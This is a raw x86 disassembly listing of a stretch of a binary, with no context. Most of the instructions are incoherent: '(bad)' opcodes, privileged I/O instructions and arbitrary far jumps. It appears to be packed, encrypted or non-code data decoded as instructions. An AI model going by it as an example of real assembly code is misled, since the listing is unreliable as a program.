  4092ce:	dec    edx
  4092cf:	or     edi,edi
  4092d1:	int    0x3b
  4092d3:	jno    0x4092d6
  4092d5:	(bad)  
  4092d6:	cli    
  4092d7:	cdq    
  4092d8:	(bad)  
  4092dc:	mov    eax,ds:0xa5b92c31
  4092e1:	cs (bad) 
  4092e3:	ins    BYTE PTR es:[edi],dx
  4092e4:	sub    ch,ah
  4092e6:	(bad)  
  4092e7:	pop    ss
  4092e8:	pop    edx
  4092e9:	or     ebp,ebp
  4092eb:	frstorw [esi-0x243a2da9]
  4092f2:	test   eax,0x19e23756
  4092f7:	sub    dh,ch
  4092f9:	das    
  4092fa:	push   0xffffff84
  4092fc:	clc    
  4092fd:	mov    esi,0x6581d2d8
  409302:	add    BYTE PTR [ecx-0x4f080ecf],bh
  409308:	outs   dx,BYTE PTR ds:[esi]
  409309:	cmc    
  40930a:	sub    DWORD PTR [eax],esp
  40930c:	sub    DWORD PTR [ecx+0x68],eax
  40930f:	cmc    
  409310:	mov    ch,0xcf
  409312:	popa   
  409313:	add    ah,BYTE PTR [ecx-0x1171f397]
  409319:	xchg   esp,eax
  40931a:	xchg   ebp,eax
  40931b:	sbb    al,0xae
  40931d:	sub    DWORD PTR [ebx+0x12b915e9],esp
  409323:	gs pop ebx
  409325:	dec    edi
  409326:	mov    DWORD PTR [edi],eax
  409328:	sub    al,0xc7
  40932a:	in     al,0x3
  40932c:	cli    
  40932d:	pushf  
  40932e:	mov    al,ds:0xe93775f8
  409333:	sub    dl,BYTE PTR [esi-0x37]
  409336:	imul   esp,DWORD PTR [edx],0xc0239bf4
  40933c:	pop    es
  40933d:	or     eax,0x5582b0ef
  409342:	int    0x1c
  409344:	xchg   esp,eax
  409345:	cld    
  409346:	and    eax,0xb15388b0
  40934b:	cmp    DWORD PTR [edx-0x1cb6dfd2],0xffffffe0
  409352:	mov    bh,0x7a
  409354:	mov    ecx,0xd8773c11
  409359:	popf   
  40935a:	imul   esi,DWORD PTR [edi-0x62],0x6981fde3
  409361:	std    
  409362:	inc    esp
  409363:	out    0x5c,al
  409365:	push   ecx
  409366:	add    BYTE PTR [ecx],0xd8
  409369:	xchg   ebx,eax
  40936a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40936b:	mov    edi,ss
  40936d:	jmp    0x9b8e:0x11396b8f
  409374:	jb     0x409355
  409376:	xchg   esi,eax
  409377:	xchg   edi,eax
  409378:	sub    ebp,DWORD PTR [eax-0x43c9c202]
  40937e:	and    DWORD PTR [esp+ebp*8-0x1f11effb],ecx
  409385:	lock sbb ebp,edx
  409388:	and    ebx,DWORD PTR [ebp+0x10]
  40938b:	mov    ecx,0x2b909b1e
  409390:	inc    esi
  409391:	xchg   edx,eax
  409392:	lods   al,BYTE PTR ds:[esi]
  409393:	fbld   TBYTE PTR [eax-0xe6334bc]
  409399:	xchg   edx,eax
  40939a:	popa   
  40939b:	sub    ecx,DWORD PTR [esi-0x56]
  40939e:	ja     0x409326
  4093a0:	ja     0x4093d8
  4093a2:	cwde   
  4093a3:	sub    ebp,esi
  4093a5:	test   eax,0x2fb3309e
  4093aa:	in     al,0x65
  4093ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093ad:	mov    cl,0x8b
  4093af:	popf   
  4093b0:	mov    eax,ds:0xc5bcb33f
  4093b5:	out    dx,eax
  4093b6:	(bad)  
  4093b7:	jecxz  0x409389
  4093b9:	dec    ebx
  4093ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4093bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093bc:	sub    ecx,edi
  4093be:	sti    
  4093bf:	stos   BYTE PTR es:[edi],al
  4093c0:	mov    BYTE PTR [edi],0x4c
  4093c3:	test   DWORD PTR [ebx-0x2f],ecx
  4093c6:	jbe    0x40941b
  4093c8:	mov    ch,0xca
  4093ca:	mov    bl,0xd9
  4093cc:	imul   esi,ebx,0xa2ee67dd
  4093d2:	mov    ecx,0x6575b92d
  4093d7:	or     BYTE PTR [edx],ch
  4093d9:	jbe    0x409425
  4093db:	sbb    eax,0xf0f5f42a
  4093e0:	scas   al,BYTE PTR es:[edi]
  4093e1:	cmp    esi,edx
  4093e3:	xchg   ebx,eax
  4093e4:	xor    DWORD PTR ss:[edi+0x2de2fe56],0x5f550c72
  4093ef:	lds    edx,FWORD PTR ds:0x1abb9460
  4093f5:	mov    cl,0x5e
  4093f7:	sub    DWORD PTR [eax+0x2015f66],edx
  4093fd:	arpl   WORD PTR [edi],cx
  4093ff:	das    
  409400:	push   es
  409401:	jb     0x40944b
  409403:	xchg   DWORD PTR [ebp-0x1cde916a],ecx
  409409:	gs jge 0x40938f
  40940c:	push   ebp
  40940d:	xchg   edx,eax
  40940e:	mov    cl,0x44
  409410:	rol    BYTE PTR [ebx-0x1e],0x16
  409414:	test   al,0xb
  409416:	cwde   
  409417:	jmp    0x8ebf49d6
  40941c:	cdq    
  40941d:	dec    ebx
  40941e:	xor    al,0x53
  409420:	fisub  WORD PTR [eax+0x7b]
  409423:	ds adc al,0xa0
  409426:	push   ebx
  409427:	mov    ebx,0xdde8e3db
  40942c:	aas    
  40942d:	mov    ecx,0x260abec9
  409432:	mov    eax,0x2e541cd3
  409437:	push   esp
  409438:	inc    ebx
  409439:	xchg   ebx,eax
  40943a:	inc    edx
  40943b:	repz jnp 0x40947c
  40943e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40943f:	jge    0x4093ef
  409441:	ror    DWORD PTR [ebx-0x3739b87a],1
  409447:	xlat   BYTE PTR ds:[ebx]
  409448:	call   0xdfb0:0x1f209014
  40944f:	cmp    eax,0xe195d066
  409454:	(bad)  
  409455:	outs   dx,BYTE PTR ds:[esi]
  409456:	out    dx,eax
  409457:	sbb    ebx,DWORD PTR [edx+eiz*4]
  40945a:	xchg   ecx,eax
  40945b:	and    DWORD PTR ds:[ebx],ecx
  40945e:	sub    bp,WORD PTR [ebp+eiz*2+0x6562674f]
  409466:	jbe    0x40944a
  409468:	pushf  
  409469:	and    BYTE PTR [edx+0xa],0x7d
  40946d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40946e:	lods   eax,DWORD PTR ds:[esi]
  40946f:	xchg   dh,al
  409471:	scas   eax,DWORD PTR es:[edi]
  409472:	aam    0x92
  409474:	das    
  409475:	pop    edx
  409476:	mov    edx,0xce8e20f2
  40947b:	ins    BYTE PTR es:[edi],dx
  40947c:	push   ebp
  40947d:	loope  0x409491
  40947f:	adc    eax,0xec10b598
  409484:	loopne 0x4094da
  409486:	sbb    ah,BYTE PTR [esp+edx*2+0x2]
  40948a:	xchg   edx,eax
  40948b:	cmc    
  40948c:	pop    es
  40948d:	xor    eax,0x74d27b7c
  409492:	add    edi,DWORD PTR [esi]
  409494:	xchg   esi,eax
  409495:	nop
  409496:	adc    al,bl
  409498:	xor    eax,0xfc69675e
  40949d:	test   eax,0xba7efeb7
  4094a2:	addr16 popa 
  4094a4:	dec    ebx
  4094a5:	loope  0x40950a
  4094a7:	cmp    DWORD PTR ds:0x2809d5ad,ebx
  4094ad:	pop    esp
  4094ae:	mov    eax,ds:0x6cdc6b9d
  4094b3:	in     eax,0x97
  4094b5:	mul    BYTE PTR [edi]
  4094b7:	cmp    eax,0x9caf4d45
  4094bc:	sub    bh,BYTE PTR [esi-0x1119b653]
  4094c2:	cmc    
  4094c3:	sbb    ch,ah
  4094c5:	cs mov esp,0x72e00b05
  4094cb:	sub    BYTE PTR [edx-0x7e85e9b7],dh
  4094d1:	sbb    DWORD PTR ds:0xd5e12221,esp
  4094d7:	rcr    BYTE PTR [ebp+0x3fc019a4],1
  4094dd:	cli    
  4094de:	fcmovu st,st(1)
  4094e0:	rcl    BYTE PTR [ebx+ecx*2+0x4fdc9d2e],0x4f
  4094e8:	mov    ch,BYTE PTR [ebp+0x441ce1e0]
  4094ee:	sub    al,0x46
  4094f0:	(bad)  
  4094f1:	or     esi,esi
  4094f3:	sub    eax,0x5e689c69
  4094f8:	and    DWORD PTR [edi],eax
  4094fa:	jnp    0x409518
  4094fc:	jne    0x409553
  4094fe:	repz jbe 0x40948b
  409501:	and    eax,0x73a49923
  409506:	stos   BYTE PTR es:[edi],al
  409507:	retf   
  409508:	and    ch,BYTE PTR [ebp+0x19]
  40950b:	pop    es
  40950c:	mov    cs,WORD PTR [edx-0x13]
  40950f:	retf   0x7c50
  409512:	mov    ah,0x67
  409514:	sbb    eax,DWORD PTR [edi]
  409516:	mov    ebx,0xedc0e8b
  40951b:	sub    eax,0x6d0df9a
  409520:	fnstcw WORD PTR [ebx+0x61]
  409523:	inc    edx
  409524:	jmp    0x409542
  409526:	les    ebx,FWORD PTR [ebx]
  409528:	jmp    0x5b30:0x7f472cef
  40952f:	rcl    BYTE PTR [ebx-0x7398a313],1
  409535:	les    ebx,FWORD PTR [ebx]
  409537:	sbb    esp,0x19dee5af
  40953d:	test   eax,0x8203ea63
  409542:	mov    edi,0x72bfc16d
  409547:	popa   
  409548:	adc    BYTE PTR [ecx],dh
  40954a:	in     al,dx
  40954b:	(bad)  
  40954d:	mov    al,0xf2
  40954f:	ret    
  409550:	dec    edx
  409551:	xor    al,0x9f
  409553:	retf   0xce7e
  409556:	jo     0x4094ff
  409558:	push   0xffffffbe
  40955a:	ret    0xdd5a
  40955d:	sbb    DWORD PTR [ecx+esi*4-0x31704104],ebx
  409564:	outs   dx,BYTE PTR ds:[esi]
  409565:	xchg   edi,eax
  409566:	xchg   ch,dl
  409568:	inc    esp
  409569:	mov    bl,0x2c
  40956b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40956c:	cmp    BYTE PTR [ecx+0x73869eab],0x9a
  409573:	mov    edx,0xa43eff2e
  409578:	xor    BYTE PTR [esp+edx*2-0x2b7e3e13],al
  40957f:	div    BYTE PTR [ebx-0x4c]
  409582:	(bad)  
  409584:	mov    esi,0x2ab6c820
  409589:	dec    esp
  40958a:	pop    esp
  40958b:	inc    ecx
  40958c:	out    0x6b,eax
  40958e:	adc    al,0xe7
  409590:	jg     0x409561
  409592:	ja     0x409528
  409594:	xor    BYTE PTR [edx],ah
  409596:	(bad)  
  409597:	ss sbb eax,0x79ff8865
  40959d:	pop    ecx
  40959e:	and    edi,edx
  4095a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4095a1:	jge    0x4095a9
  4095a3:	fld    TBYTE PTR [edx+0x2f85fa5b]
  4095a9:	cwde   
  4095aa:	jmp    0x833:0x9aef7d1
  4095b1:	mov    DWORD PTR [edi],0x53c16c2b
  4095b7:	mov    ds:0x78ffba3b,al
  4095bc:	lods   al,BYTE PTR ds:[esi]
  4095bd:	cld    
  4095be:	add    BYTE PTR [eax-0x106aea7a],0x6e
  4095c5:	aaa    
  4095c6:	jecxz  0x4095f6
  4095c8:	pop    es
  4095c9:	mov    edi,0xa5065b14
  4095ce:	sbb    BYTE PTR [ebx-0x675d64c8],0xbc
  4095d5:	pop    ecx
  4095d7:	mov    DWORD PTR [eiz*1+0x66be68f2],edx
  4095de:	(bad)  
  4095df:	sub    BYTE PTR [ebx+eiz*8],ah
  4095e2:	push   esi
  4095e3:	push   ecx
  4095e4:	(bad)
  4095e7:	or     DWORD PTR [eax-0x701d5a45],ebp
  4095ed:	inc    esi
  4095ee:	(bad)  
  4095f1:	lods   eax,DWORD PTR ds:[esi]
  4095f2:	inc    ebx
  4095f3:	jmp    0x28e51297
  4095f8:	xchg   edi,eax
  4095f9:	lahf   
  4095fa:	push   0x355ba3f5
  4095ff:	or     ebp,ecx
  409601:	or     eax,0x26795587
  409606:	in     al,dx
  409607:	pop    ebp
  409608:	(bad)  
  409609:	clc    
  40960a:	nop
  40960b:	test   al,0x93
  40960d:	lahf   
  40960e:	fstp   DWORD PTR [ebx]
  409610:	adc    ch,0x3b
  409613:	retf   
  409614:	sar    DWORD PTR [esi],1
  409616:	sbb    BYTE PTR [eax-0x3505b904],ah
  40961c:	add    ah,dh
  40961e:	pop    es
  40961f:	sbb    eax,0x95f4c2db
  409624:	jl     0x409623
  409626:	fs pop ds
  409628:	iret   
  409629:	fidiv  DWORD PTR [ebx+0x540d5563]
  40962f:	xchg   edi,eax
  409630:	sub    edx,DWORD PTR ds:0x8f2a2872
  409636:	mov    bl,0x5c
  409638:	arpl   WORD PTR [esi-0x27c8b398],ax
  40963e:	popf   
  40963f:	test   eax,0x20983a68
  409644:	sbb    ebx,DWORD PTR [eax+0x7adfe389]
  40964a:	popf   
  40964b:	cmp    eax,eax
  40964d:	push   esp
  40964e:	pop    edi
  40964f:	fisttp WORD PTR [edx]
  409651:	jae    0x40964a
  409653:	into   
  409654:	xchg   BYTE PTR [edx-0x65ba050f],bl
  40965a:	jmp    0x8dc9:0xb3e18dd7
  409661:	repnz inc ebp
  409663:	(bad)  [eax]
  409665:	add    eax,0x5652cb3e
  40966a:	pop    ebp
  40966b:	jbe    0x40961a
  40966d:	pop    edi
  40966e:	ss cwde 
  409670:	jl     0x4096f1
  409672:	hlt    
  409673:	repz sar ebx,1
  409676:	sar    BYTE PTR [eax],cl
  409678:	jae    0x40967d
  40967a:	xor    al,0x1f
  40967c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40967d:	push   es
  40967e:	test   al,0x4d
  409680:	jp     0x409669
  409682:	pop    ebp
  409683:	xabort 0x21
  409686:	outs   dx,DWORD PTR ds:[esi]
  409687:	sbb    eax,0x999af456
  40968c:	rcl    ah,0x2c
  40968f:	mov    bh,0xce
  409691:	pop    edx
  409692:	popf   
  409693:	xor    al,0xed
  409695:	std    
  409696:	cli    
  409697:	pop    es
  409698:	mov    bl,0x48
  40969a:	outs   dx,DWORD PTR ds:[esi]
  40969b:	sbb    eax,0x99247ed1
  4096a0:	push   ebx
  4096a1:	mov    ds:0x528cb134,al
  4096a6:	and    DWORD PTR [esi+0x1b308663],0x46
  4096ad:	retf   
  4096ae:	outs   dx,DWORD PTR ds:[esi]
  4096af:	mov    edi,0xf63e210f
  4096b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096b5:	or     ch,BYTE PTR [ebx+0x6d4dea06]
  4096bb:	pop    ebx
  4096bc:	inc    eax
  4096bd:	les    edx,FWORD PTR [edi+eax*4]
  4096c0:	shl    BYTE PTR [ebp-0x29],cl
  4096c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096c4:	cmp    BYTE PTR [ecx],cl
  4096c6:	fsubrp st(6),st
  4096c8:	jno    0x409723
  4096ca:	inc    eax
  4096cb:	jne    0x40968c
  4096cd:	pop    esi
  4096ce:	aaa    
  4096cf:	outs   dx,DWORD PTR ds:[esi]
  4096d0:	aaa    
  4096d1:	sub    bl,al
  4096d3:	mov    WORD PTR [edx-0x16864eda],?
  4096d9:	js     0x4096df
  4096db:	pop    ebx
  4096dc:	lods   al,BYTE PTR ds:[esi]
  4096dd:	adc    BYTE PTR [ebp+0x41f8c6fb],dh
  4096e3:	and    al,0x31
  4096e5:	stos   DWORD PTR es:[edi],eax
  4096e6:	js     0x40970a
  4096e8:	pop    ss
  4096e9:	cmp    eax,0x46cd80f2
  4096ee:	daa    
  4096ef:	mov    edi,0x5e579cf8
  4096f4:	cmp    BYTE PTR [ebx-0x47],ah
  4096f7:	mov    ebx,0x5268336b
  4096fc:	bound  ebp,QWORD PTR [ebp-0x44bc8a77]
  409702:	les    ebp,FWORD PTR [ecx]
  409704:	leave  
  409705:	pop    edx
  409706:	fistp  DWORD PTR [edx+0x7abf363]
  40970c:	and    al,0x53
  40970e:	clc    
  40970f:	adc    al,0x72
  409711:	test   DWORD PTR [eax+0x2a],edi
  409714:	popf   
  409715:	sar    BYTE PTR [ebx+0x2cd31b53],1
  40971b:	pop    ds
  40971c:	outs   dx,BYTE PTR ds:[esi]
  40971d:	imul   dl
  40971f:	sub    DWORD PTR gs:[edi+0x5f],0xe4d5f9b1
  409727:	(bad)  
  409728:	ds cmp ebx,esi
  40972b:	xchg   BYTE PTR [ecx+ebx*1-0x15],bh
  40972f:	out    0x36,al
  409731:	push   ecx
  409732:	outs   dx,BYTE PTR ds:[esi]
  409733:	push   edx
  409734:	enter  0x346a,0x5b
  409738:	sahf   
  409739:	test   BYTE PTR [ecx],bl
  40973b:	fmul   st(7),st
  40973d:	push   ds
  40973e:	aas    
  40973f:	scas   eax,DWORD PTR es:[edi]
  409740:	cmp    eax,0xe842cf68
  409746:	stos   DWORD PTR es:[edi],eax
  409747:	hlt    
  409748:	jno    0x4097a2
  40974a:	daa    
  40974b:	lods   eax,DWORD PTR ds:[esi]
  40974c:	das    
  40974d:	fcomp  st(6)
  40974f:	mov    cl,0x12
  409751:	xor    BYTE PTR ss:[eiz*4+0x6ed1be11],dh
  409759:	push   ds
  40975a:	add    bh,BYTE PTR [ecx-0x5208a3b6]
  409760:	mov    dh,0x31
  409762:	adc    DWORD PTR [eax+0x2ac9ba25],eax
  409768:	test   al,0xd0
  40976a:	icebp  
  40976b:	(bad)  
  40976c:	std    
  40976d:	sbb    edi,DWORD PTR [ecx-0x2f]
  409770:	sub    BYTE PTR [esi+0x74],0xf5
  409774:	dec    ecx
  409775:	ficom  WORD PTR [edx]
  409777:	jle    0x409738
  409779:	out    dx,eax
  40977a:	sti    
  40977b:	sub    DWORD PTR [ecx+eax*1-0x59],ebx
  40977f:	jecxz  0x40971c
  409781:	push   ebx
  409782:	neg    DWORD PTR [edi+0x55]
  409785:	sub    cl,ch
  409787:	dec    edi
  409788:	cs jp  0x409730
  40978b:	push   ebx
  40978c:	jae    0x4097fd
  40978e:	pop    eax
  40978f:	into   
  409790:	push   ebp
  409791:	adc    cl,BYTE PTR [edx-0x6e]
  409794:	lods   eax,DWORD PTR ds:[esi]
  409795:	sbb    eax,0x1521590b
  40979a:	fwait
  40979b:	or     BYTE PTR [ecx-0x2579e37c],bh
  4097a1:	or     eax,0xb935574
  4097a6:	stos   BYTE PTR es:[edi],al
  4097a7:	loopne 0x40974b
  4097a9:	retf   
  4097aa:	cmp    eax,0x58072a34
  4097af:	sbb    ecx,DWORD PTR [ecx+0x9]
  4097b2:	mov    al,0x7b
  4097b4:	fyl2x  
  4097b6:	xchg   esp,eax
  4097b7:	nop
  4097b8:	mov    ecx,0x381e736f
  4097bd:	jp     0x4097c3
  4097bf:	cmc    
  4097c0:	sahf   
  4097c1:	sbb    al,0x55
  4097c3:	les    eax,FWORD PTR [edx+0x4a]
  4097c6:	hlt    
  4097c7:	or     DWORD PTR [edx+0xe],edx
  4097ca:	xor    eax,0x26047ed8
  4097cf:	das    
  4097d0:	mov    dl,0x8
  4097d2:	or     dl,dl
  4097d4:	cmp    al,0x21
  4097d6:	xor    BYTE PTR [edi-0x5e],bh
  4097d9:	stc    
  4097da:	sbb    al,0xb8
  4097dc:	inc    edi
  4097dd:	shl    bh,cl
  4097df:	enter  0x935c,0x10
  4097e3:	pop    edx
  4097e4:	stc    
  4097e5:	popa   
  4097e6:	bound  edi,QWORD PTR [eax]
  4097e8:	mov    ds:0x81c34989,al
  4097ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4097ee:	int    0x1a
  4097f0:	imul   ecx,DWORD PTR [edx+0xc5c4064],0x60
  4097f7:	(bad)  
  4097f8:	aam    0xb3
  4097fa:	fldenv ds:0x9b597c8d
  409800:	jae    0x409831
  409802:	fild   QWORD PTR [ebx]
  409804:	fbld   TBYTE PTR [eax]
  409806:	mov    al,0xa4
  409808:	cmp    al,0x57
  40980a:	clc    
  40980b:	addr16 out 0x9a,eax
  40980e:	jl     0x4097b3
  409810:	add    BYTE PTR [esp+ecx*8-0x2ffcf60e],cl
  409817:	push   ecx
  409818:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409819:	stc    
  40981a:	ret    0x38f0
  40981d:	xchg   edx,eax
  40981e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40981f:	fs test eax,0x1b86e8fd
  409825:	aas    
  409826:	es scas al,BYTE PTR es:[edi]
  409828:	aas    
  409829:	and    DWORD PTR [edx-0x19],ecx
  40982c:	imul   ebx,esi,0xffffff94
  40982f:	fs loopne 0x409829
  409832:	(bad)  
  409833:	jae    0x409839
  409835:	cwde   
  409836:	ss pop eax
  409838:	xchg   esp,eax
  409839:	loop   0x409855
  40983b:	or     eax,0x776b4d4c
  409840:	aam    0xcb
  409842:	int3   
  409843:	add    ah,BYTE PTR [esi+0x7d866aa8]
  409849:	xlat   BYTE PTR ds:[ebx]
  40984a:	push   es
  40984b:	mov    ah,0x24
  40984d:	ss push ds
  40984f:	mov    dh,BYTE PTR [esi+esi*8+0x5c2a5ac1]
  409856:	call   0x93d:0x4bc919c
  40985d:	mov    edx,0x8e4051ba
  409862:	in     al,0xfd
  409864:	adc    esp,DWORD PTR [ebp+edi*1+0x733ae662]
  40986b:	jmp    0x16ed:0xc6c808a6
  409872:	adc    eax,0x474b82b2
  409877:	cdq    
  409878:	xor    DWORD PTR [ebx+0x58ac92a2],ebx
  40987e:	loope  0x4098ae
  409880:	out    dx,eax
  409881:	shr    BYTE PTR [eax],1
  409883:	out    dx,eax
  409884:	sar    DWORD PTR [esi-0x38],1
  409887:	pop    edi
  409888:	adc    dl,dh
  40988a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40988b:	jb     0x4098f1
  40988d:	push   esi
  40988e:	and    al,0xab
  409891:	jecxz  0x4098da
  409893:	push   0x78
  409895:	mov    ebp,0x63e2edd7
  40989a:	inc    edi
  40989b:	ss jns 0x4098c2
  40989e:	xor    al,0x27
  4098a0:	repnz stc 
  4098a2:	pop    es
  4098a3:	add    DWORD PTR [ebx+0x576c98e],edi
  4098a9:	sub    BYTE PTR [eax+0x3a480824],dl
  4098af:	mov    BYTE PTR [edx+0x79e2edd2],ah
  4098b5:	js     0x40986d
  4098b7:	retf   
  4098b8:	iret   
  4098b9:	or     eax,0xbc9cf012
  4098be:	mov    dh,0x48
  4098c0:	mov    cl,0xa6
  4098c2:	sub    BYTE PTR [eax+0x2f3f0a91],ch
  4098c8:	nop
  4098c9:	mov    ebx,0x4f3fb9fb
  4098ce:	sub    al,0xf4
  4098d0:	or     al,0x82
  4098d2:	inc    edi
  4098d3:	(bad)  
  4098d4:	sub    al,0x1b
  4098d6:	lods   al,BYTE PTR ds:[esi]
  4098d7:	int    0x74
  4098d9:	rol    BYTE PTR [ebp+0x56],0xe8
  4098dd:	pop    es
  4098de:	sub    cl,dl
  4098e0:	stos   BYTE PTR es:[edi],al
  4098e1:	enter  0x776b,0x65
  4098e5:	jns    0x409881
  4098e7:	mov    eax,ds:0xd5b87f0f
  4098ec:	dec    eax
  4098ed:	outs   dx,DWORD PTR ds:[esi]
  4098ee:	stos   BYTE PTR es:[edi],al
  4098ef:	repz mov ss:0x6823364d,eax
  4098f6:	clc    
  4098f7:	test   DWORD PTR [edi+0x7e52be1a],ebx
  4098fd:	sbb    al,0x4e
  409900:	inc    esp
  409901:	xchg   edx,eax
  409902:	sbb    bh,bl
  409904:	push   ecx
  409905:	fiadd  WORD PTR [ebp-0x22]
  409908:	mov    ds:0xdb147443,al
  40990d:	icebp  
  40990e:	or     dh,BYTE PTR [eax-0x53c8697f]
  409914:	gs test al,0xdd
  409917:	repz dec esp
  409919:	sbb    DWORD PTR [ebx-0x1a478642],0xffffff90
  409920:	inc    eax
  409921:	in     ax,dx
  409923:	mov    esi,0x3145f903
  409928:	and    cl,BYTE PTR [ecx+eax*1]
  40992b:	jae    0x4098df
  40992d:	mov    eax,0x7639fe21
  409932:	xchg   esp,eax
  409933:	mov    eax,0x65648a37
  409938:	push   eax
  409939:	clc    
  40993a:	push   eax
  40993b:	add    al,BYTE PTR [ebx-0x4a4101ec]
  409941:	ss xor ch,bh
  409944:	xor    bl,BYTE PTR [edx+0x5]
  409947:	in     eax,0x46
  409949:	cdq    
  40994a:	call   0x9bd8750d
  40994f:	popa   
  409950:	loop   0x4098fb
  409952:	out    dx,eax
  409953:	mov    ah,0xe1
  409955:	clc    
  409956:	mov    ebx,0xa8eb6630
  40995b:	jo     0x4099db
  40995d:	mov    al,ds:0x7a2890f6
  409962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409963:	dec    edi
  409964:	scas   al,BYTE PTR es:[edi]
  409965:	jge    0x4099d4
  409967:	cdq    
  409968:	int3   
  409969:	inc    esp
  40996a:	mov    dl,0xb8
  40996c:	add    eax,0xadd32c8
  409971:	xor    bh,BYTE PTR [edx+0x45cfc909]
  409977:	cmp    al,0x7e
  409979:	clc    
  40997a:	sahf   
  40997b:	(bad)  
  40997d:	adc    DWORD PTR [edi],edi
  40997f:	loop   0x4099f5
  409981:	(bad)  
  409982:	imul   edi,DWORD PTR [edx-0x1],0xffffffb0
  409986:	stc    
  409987:	rol    BYTE PTR [ecx+edi*4],1
  40998a:	retf   0x4652
  40998d:	and    cl,BYTE PTR [ebp+eiz*8+0x69]
  409991:	push   0xfffffff9
  409993:	outs   dx,DWORD PTR ds:[esi]
  409994:	and    BYTE PTR ds:0x7e8497ad,ch
  40999a:	sbb    eax,0x439e07af
  40999f:	(bad)
  4099a2:	lds    esi,FWORD PTR [ebx-0x66]
  4099a5:	fstp   QWORD PTR [eax-0x23]
  4099a8:	cmp    DWORD PTR [edi-0x6add1581],ebp
  4099ae:	and    eax,0x6e9c2142
  4099b3:	push   ebx
  4099b4:	or     eax,0xd0a2ba7e
  4099b9:	call   0x134a:0x9d049bd3
  4099c0:	xchg   edi,eax
  4099c1:	dec    edi
  4099c2:	inc    ecx
  4099c3:	push   0xa02421c1
  4099c8:	sbb    esp,DWORD PTR [ebx-0x74]
  4099cb:	test   al,0xb2
  4099cd:	sahf   
  4099ce:	push   ebp
  4099cf:	push   0xeb08c822
  4099d4:	mov    esi,0xee38e754
  4099d9:	jmp    0x409a19
  4099db:	pop    ds
  4099dc:	das    
  4099dd:	lods   eax,DWORD PTR ds:[esi]
  4099de:	je     0x409a46
  4099e0:	cmp    al,0xb4
  4099e2:	mov    cl,BYTE PTR [edi-0x20]
  4099e5:	sub    BYTE PTR [esi-0x25082c0f],0x15
  4099ec:	lods   al,BYTE PTR ds:[esi]
  4099ed:	rol    BYTE PTR ds:0x66197392,1
  4099f3:	mov    eax,ds:0xed54ec7d
  4099f8:	mov    al,ds:0xcd2d3d5e
  4099fd:	retf   0x9c85
  409a00:	fs mov ebx,0x27682365
  409a06:	stos   DWORD PTR es:[edi],eax
  409a07:	int3   
  409a08:	pop    esi
  409a09:	or     BYTE PTR [edi-0x3],ah
  409a0c:	xor    eax,0x76a0e6f5
  409a11:	loop   0x409a0b
  409a13:	stc    
  409a14:	ror    BYTE PTR [edx],1
  409a16:	ins    DWORD PTR es:[edi],dx
  409a17:	lods   eax,DWORD PTR ds:[esi]
  409a18:	cmp    BYTE PTR [bp+di+0x201e],0x2a
  409a1e:	sbb    al,0x7e
  409a20:	cmp    eax,0xedec2443
  409a25:	xlat   BYTE PTR ds:[ebx]
  409a26:	fwait
  409a27:	push   ss
  409a28:	ja     0x409a24
  409a2a:	add    al,0x9c
  409a2c:	inc    eax
  409a2d:	leave  
  409a2e:	or     al,0xe2
  409a30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a31:	(bad)  
  409a32:	int    0xe
  409a34:	push   cs
  409a35:	enter  0x3509,0xe2
  409a39:	push   esp
  409a3a:	jmp    0x6af3:0x89293b20
  409a41:	pop    es
  409a42:	fstp   TBYTE PTR [esi+0x28bc7127]
  409a48:	loop   0x4099f9
  409a4a:	pop    ebp
  409a4b:	jbe    0x409a5c
  409a4d:	or     BYTE PTR [ecx-0x4c],bl
  409a50:	out    dx,al
  409a51:	and    BYTE PTR [edi-0x53],dh
  409a54:	push   edx
  409a55:	cmp    BYTE PTR [edi],dl
  409a57:	xchg   edi,eax
  409a58:	jmp    0x2dbec74c
  409a5d:	xchg   edi,eax
  409a5e:	in     al,0xc
  409a60:	test   al,bl
  409a62:	std    
  409a63:	rcl    BYTE PTR [edx+edi*4+0x2],cl
  409a67:	int3   
  409a68:	shl    ebp,1
  409a6a:	mov    ss,WORD PTR [ebx+ecx*4-0x74]
  409a6e:	mov    WORD PTR [ecx+esi*8+0x3b],gs
  409a72:	rcl    BYTE PTR [esi],cl
  409a74:	mov    ebp,0xd5f24037
  409a79:	ins    BYTE PTR es:[edi],dx
  409a7a:	cli    
  409a7b:	(bad)
  409a7f:	sub    bh,bh
  409a81:	mov    dh,0x91
  409a83:	inc    edi
  409a84:	icebp  
  409a85:	sub    bl,BYTE PTR es:[ecx-0x51ea33d7]
  409a8c:	sub    esp,DWORD PTR [edi-0x214be725]
  409a92:	xor    DWORD PTR [edx+0x4b],esp
  409a95:	jnp    0x409aec
  409a97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a98:	es das 
  409a9a:	lock jae 0x409ad5
  409a9d:	call   0x1283:0x70a5dde8
  409aa4:	hlt    
  409aa5:	or     al,0xa9
  409aa7:	leave  
  409aa8:	pop    es
  409aa9:	in     eax,0x19
  409aab:	cmp    BYTE PTR [eax-0x34c11dfd],cl
  409ab1:	ins    DWORD PTR es:[edi],dx
  409ab2:	cmp    ah,dh
  409ab4:	into   
  409ab5:	and    ebx,DWORD PTR [eax+edx*2+0x466a9d07]
  409abc:	clc    
  409abd:	mov    ebp,0x7e409400
  409ac2:	cmc    
  409ac3:	in     eax,0xce
  409ac5:	push   edx
  409ac6:	pop    ebp
  409ac7:	mov    edx,0xcd47c71
  409acc:	clc    
  409acd:	lock xchg ebp,eax
  409acf:	cli    
  409ad0:	xchg   esp,eax
  409ad1:	xor    esi,DWORD PTR [ecx+0x2c]
